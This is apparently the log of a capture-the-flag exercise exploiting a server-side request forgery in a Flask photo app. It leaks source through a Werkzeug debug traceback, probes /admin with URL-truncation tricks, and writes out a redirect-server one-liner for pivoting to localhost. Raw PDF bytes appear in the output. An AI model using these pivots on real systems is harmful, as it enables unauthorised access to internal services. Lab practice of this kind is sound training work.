@@ -1,0 +1,267 @@
+=== PlantPhoto Admin Hunt ===
+
+[2] Extracting source code from Werkzeug error traceback...
+  Code block 0:
+    def __call__(self, environ, start_response):
+    &quot;&quot;&quot;The WSGI server calls the Flask application object as the
+    WSGI application. This calls :meth:`wsgi_app` which can be
+    wrapped to applying middleware.&quot;&quot;&quot;
+    return self.wsgi_app(environ, start_response)
+    def __repr__(self):
+    return &quot;&lt;%s %r&gt;&quot; % (self.__class__.__name__, self.name)
+  Code block 1:
+    try:
+    ctx.push()
+    response = self.full_dispatch_request()
+    except Exception as e:
+    error = e
+    response = self.handle_exception(e)
+    except:  # noqa: B001
+    error = sys.exc_info()[1]
+    raise
+    return response(environ, start_response)
+    finally:
+  Code block 2:
+    # if we want to repropagate the exception, we can attempt to
+    # raise it with the whole traceback in case we can do that
+    # (the function was actually called from the except part)
+    # otherwise, we just raise the error again
+    if exc_value is e:
+    reraise(exc_type, exc_value, tb)
+    else:
+    raise e
+    self.log_exception((exc_type, exc_value, tb))
+    server_error = InternalServerError()
+  Code block 3:
+    import collections.abc as collections_abc
+    def reraise(tp, value, tb=None):
+    if value.__traceback__ is not tb:
+    raise value.with_traceback(tb)
+    raise value
+    implements_to_string = _identity
+    else:
+    iterkeys = lambda d: d.iterkeys()
+  Code block 4:
+    ctx = self.request_context(environ)
+    error = None
+    try:
+    try:
+    ctx.push()
+    response = self.full_dispatch_request()
+    except Exception as e:
+    error = e
+    response = self.handle_exception(e)
+    except:  # noqa: B001
+    error = sys.exc_info()[1]
+  Code block 5:
+    request_started.send(self)
+    rv = self.preprocess_request()
+    if rv is None:
+    rv = self.dispatch_request()
+    except Exception as e:
+    rv = self.handle_user_exception(e)
+    return self.finalize_request(rv)
+    def finalize_request(self, rv, from_error_handler=False):
+    &quot;&quot;&quot;Given the return value from a view function this finalizes
+    the request by converting it into a response and invoking the
+  Code block 6:
+    return self.handle_http_exception(e)
+    handler = self._find_error_handler(e)
+    if handler is None:
+    reraise(exc_type, exc_value, tb)
+    return handler(e)
+    def handle_exception(self, e):
+    &quot;&quot;&quot;Handle an exception that did not have an error handler
+    associated with it, or that was raised from an error handler.
+  Code block 7:
+    import collections.abc as collections_abc
+    def reraise(tp, value, tb=None):
+    if value.__traceback__ is not tb:
+    raise value.with_traceback(tb)
+    raise value
+    implements_to_string = _identity
+    else:
+    iterkeys = lambda d: d.iterkeys()
+  Code block 8:
+    self.try_trigger_before_first_request_functions()
+    try:
+    request_started.send(self)
+    rv = self.preprocess_request()
+    if rv is None:
+    rv = self.dispatch_request()
+    except Exception as e:
+    rv = self.handle_user_exception(e)
+    return self.finalize_request(rv)
+    def finalize_request(self, rv, from_error_handler=False):
+  Code block 9:
+    getattr(rule, &quot;provide_automatic_options&quot;, False)
+    and req.method == &quot;OPTIONS&quot;
+    ):
+    return self.make_default_options_response()
+    # otherwise dispatch to the handler for that endpoint
+    return self.view_functions[rule.endpoint](**req.view_args)
+    def full_dispatch_request(self):
+    &quot;&quot;&quot;Dispatches the request and on top of that performs request
+    pre and postprocessing as well as HTTP exception catching and
+    error handling.
+  Code block 10:
+    response_buf = BytesIO()
+    crl = pycurl.Curl()
+    crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
+    crl.setopt(crl.WRITEDATA, response_buf)
+    crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
+    crl.perform()
+    crl.close()
+    file_data = response_buf.getvalue()
+    resp = Response(file_data)
+    resp.headers['Content-Type'] = 'application/pdf'
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/_compat.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/_compat.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/local/lib/python3.10/site-packages/flask/app.py
+  File ref: /usr/src/app/app.py
+  Pre block: def __call__(self, environ, start_response):
+  Pre block: &quot;&quot;&quot;The WSGI server calls the Flask application object as the
+  Pre block: WSGI application. This calls :meth:`wsgi_app` which can be
+  Pre block: wrapped to applying middleware.&quot;&quot;&quot;
+  Pre block: return self.wsgi_app(environ, start_response)
+  Pre block: def __repr__(self):
+  Pre block: return &quot;&lt;%s %r&gt;&quot; % (self.__class__.__name__, self.name)
+  Pre block: response = self.full_dispatch_request()
+  Pre block: except Exception as e:
+  Pre block: response = self.handle_exception(e)
+  Pre block: except:  # noqa: B001
+  Pre block: error = sys.exc_info()[1]
+  Pre block: return response(environ, start_response)
+  Pre block: # if we want to repropagate the exception, we can attempt to
+  Pre block: # raise it with the whole traceback in case we can do that
+  Pre block: # (the function was actually called from the except part)
+  Pre block: # otherwise, we just raise the error again
+  Pre block: if exc_value is e:
+  Pre block: reraise(exc_type, exc_value, tb)
+  Pre block: self.log_exception((exc_type, exc_value, tb))
+  Pre block: server_error = InternalServerError()
+  Pre block: import collections.abc as collections_abc
+  Pre block: def reraise(tp, value, tb=None):
+  Pre block: if value.__traceback__ is not tb:
+  Pre block: raise value.with_traceback(tb)
+  Pre block: raise value
+  Pre block: implements_to_string = _identity
+  Pre block: iterkeys = lambda d: d.iterkeys()
+  Pre block: ctx = self.request_context(environ)
+  Pre block: error = None
+  Pre block: response = self.full_dispatch_request()
+  Pre block: except Exception as e:
+  Pre block: response = self.handle_exception(e)
+  Pre block: except:  # noqa: B001
+  Pre block: error = sys.exc_info()[1]
+  Pre block: request_started.send(self)
+  Pre block: rv = self.preprocess_request()
+  Pre block: if rv is None:
+  Pre block: rv = self.dispatch_request()
+  Pre block: except Exception as e:
+  Pre block: rv = self.handle_user_exception(e)
+  Pre block: return self.finalize_request(rv)
+  Pre block: def finalize_request(self, rv, from_error_handler=False):
+  Pre block: &quot;&quot;&quot;Given the return value from a view function this finalizes
+  Pre block: the request by converting it into a response and invoking the
+  Pre block: return self.handle_http_exception(e)
+  Pre block: handler = self._find_error_handler(e)
+  Pre block: if handler is None:
+  Pre block: reraise(exc_type, exc_value, tb)
+  Pre block: return handler(e)
+  Pre block: def handle_exception(self, e):
+  Pre block: &quot;&quot;&quot;Handle an exception that did not have an error handler
+  Pre block: associated with it, or that was raised from an error handler.
+  Pre block: import collections.abc as collections_abc
+  Pre block: def reraise(tp, value, tb=None):
+  Pre block: if value.__traceback__ is not tb:
+  Pre block: raise value.with_traceback(tb)
+  Pre block: raise value
+  Pre block: implements_to_string = _identity
+  Pre block: iterkeys = lambda d: d.iterkeys()
+  Pre block: self.try_trigger_before_first_request_functions()
+  Pre block: request_started.send(self)
+  Pre block: rv = self.preprocess_request()
+  Pre block: if rv is None:
+  Pre block: rv = self.dispatch_request()
+  Pre block: except Exception as e:
+  Pre block: rv = self.handle_user_exception(e)
+  Pre block: return self.finalize_request(rv)
+  Pre block: def finalize_request(self, rv, from_error_handler=False):
+  Pre block: getattr(rule, &quot;provide_automatic_options&quot;, False)
+  Pre block: and req.method == &quot;OPTIONS&quot;
+  Pre block: return self.make_default_options_response()
+  Pre block: # otherwise dispatch to the handler for that endpoint
+  Pre block: return self.view_functions[rule.endpoint](**req.view_args)
+  Pre block: def full_dispatch_request(self):
+  Pre block: &quot;&quot;&quot;Dispatches the request and on top of that performs request
+  Pre block: pre and postprocessing as well as HTTP exception catching and
+  Pre block: error handling.
+  Pre block: response_buf = BytesIO()
+  Pre block: crl = pycurl.Curl()
+  Pre block: crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
+  Pre block: crl.setopt(crl.WRITEDATA, response_buf)
+  Pre block: crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
+  Pre block: crl.perform()
+  Pre block: crl.close()
+  Pre block: file_data = response_buf.getvalue()
+  Pre block: resp = Response(file_data)
+  Pre block: resp.headers['Content-Type'] = 'application/pdf'
+
+[3] Trying URL tricks to access /admin...
+  [port8087 + # truncate] Status:200 Len:20
+  [localhost:8087 + # truncate] Status:200 Len:20
+  [port8087 + ? truncate] Status:200 Len:39099 <<<< INTERESTING
+    Body: %PDF-1.6
+%äüöß
+2 0 obj
+<</Length 3 0 R/Filter/FlateDecode>>
+stream
+x��QMK1��W̹�tf�5�e�붠����V��b/�}'�VP<�@�dx�1AK�i> -�@$�9���ӓ�]��!�uz6�O�Y��#\�"r���h�x1��⣥:C1䃕���d�d(��٫�@9�uH���c��	���~:̽[%���슙��M"�gOJ�vJѧJ� r6f� �4����P�kK�Z�!�r��V8����j���67�;����L.�.��^d9����!Y�_�j����F�|��
+    Headers: {'Content-Type': 'application/pdf', 'Content-Length': '40958', 'Content-Disposition': 'attachment', 'Server': 'Werkzeug/0.16.0 Python/3.10.7', 'Date': 'Mon, 30 Mar 2026 18:54:14 GMT'}
+  [@ trick port8087] Status:200 Len:20
+  [@ trick port80] Status:200 Len:20
+  [url encoded / and #] Status:200 Len:39099 <<<< INTERESTING
+    Body: %PDF-1.6
+%äüöß
+2 0 obj
+<</Length 3 0 R/Filter/FlateDecode>>
+stream
+x��QMK1��W̹�tf�5�e�붠����V��b/�}'�VP<�@�dx�1AK�i> -�@$�9���ӓ�]��!�uz6�O�Y��#\�"r���h�x1��⣥:C1䃕���d�d(��٫�@9�uH���c��	���~:̽[%���슙��M"�gOJ�vJѧJ� r6f� �4����P�kK�Z�!�r��V8����j���67�;����L.�.��^d9����!Y�_�j����F�|��
+    Headers: {'Content-Type': 'application/pdf', 'Content-Length': '40958', 'Content-Disposition': 'attachment', 'Server': 'Werkzeug/0.16.0 Python/3.10.7', 'Date': 'Mon, 30 Mar 2026 18:54:14 GMT'}
+  [loopback port80 + #] Status:200 Len:20
+  [port5000 + #] Status:200 Len:20
+  [port8000 + #] Status:200 Len:20
+  [port8080 + #] Status:200 Len:20
+  [port3000 + #] Status:200 Len:20
+
+[5] Getting full Werkzeug traceback for source code...
+    2463
+    2449
+    1866
+    39
+    2446
+    1951
+    1820
+    1949
+    1935
+    31
+
+[4] INFO: To use HTTP redirect trick:
+  On attackbox, run a redirect server:
+    python3 -c "
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    class R(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(302)
+            self.send_header('Location','http://127.0.0.1:PORT/admin')
+            self.end_headers()
+    HTTPServer(('0.0.0.0',9999),R).serve_forever()"
+  Then trigger: /download?server=10.82.105.71:9999&id=1
